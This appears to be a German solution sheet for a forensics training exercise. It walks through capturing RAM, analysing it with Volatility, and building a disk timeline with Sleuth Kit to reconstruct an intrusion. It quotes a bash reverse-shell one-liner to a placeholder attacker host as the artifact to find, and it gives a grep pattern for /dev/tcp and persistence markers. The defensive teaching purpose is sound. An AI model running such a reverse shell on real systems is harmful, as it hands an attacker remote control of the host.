# Lösung – Übung 06: Memory- & Disk-Forensik

## 1. RAM-Image

```bash
# Linux (avml, einfach, kein Kernel-Modul-Build nötig):
sudo ./avml mem.lime
sha256sum mem.lime > mem.sha256
# Alternativ LiME (kernelmodul) für .lime
```

## 2. Volatility-Analyse

```bash
# Volatility 3:
vol -f mem.lime linux.pslist          # Prozesse
vol -f mem.lime linux.pstree          # Prozessbaum (Eltern/Kind)
vol -f mem.lime linux.sockstat        # Netzverbindungen -> C2-IP/Port
vol -f mem.lime linux.malfind         # Code-Injection
vol -f mem.lime linux.bash            # Bash-History aus dem RAM
```
Finde den auffälligen Prozess (z. B. die Reverse-Shell / `meterpreter`-Payload), seine **Verbindung** zur Angreifer-IP:4444 (C2) und ungewöhnliche Eltern (z. B. `apache`→`sh`→`bash -i`).

## 3. Kommandozeile / Persistence

```bash
vol -f mem.lime linux.psaux           # vollständige Kommandozeilen
```
Zeigt z. B. `bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'` → belegt die Reverse-Shell + Quelle.

## 4. Disk-Image

```bash
# Dateisystem-Timeline / Artefakte (Sleuth Kit):
fls -r -m / disk.img > bodyfile
mactime -b bodyfile -d > timeline.csv
# Persistence suchen (am gemounteten read-only Image / icat):
grep -R "authorized_keys\|/dev/tcp\|@reboot" <mount-ro>/etc <mount-ro>/home 2>/dev/null
# gelöschte Dateien:
fls -rd disk.img
```
Finde cron/authorized_keys/systemd-Persistence (vgl. `post-exploitation-pivoting` 03), hochgeladene Tools, History.

## 5. Zusammenführen

Memory: Prozess X (von apache gestartet) spricht mit `<KALI>:4444` (C2). Disk: Webshell unter `/var/www/.../uploads/` + Cron-Persistence + SSH-Key. → **Erstzugang über Web-Upload → Reverse-Shell → Persistence**. Kohärente Angriffsgeschichte (Basis für Timeline, Übung 08).

## Häufige Fehler / Troubleshooting

- **avml/LiME passt nicht zum Kernel:** avml ist robuster (userspace); LiME braucht passende Kernel-Header.
- **Falsches Volatility-Profil (vol2):** vol3 erkennt Linux meist automatisch; Symbole/ISF ggf. nötig.
- **Disk rw gemountet:** verändert Zeitstempel → nur `ro,noexec`; besser über Sleuth Kit direkt am Image.
- **RAM zu spät gesichert:** Host wurde ausgeschaltet → Memory weg (Order of Volatility, Übung 05).
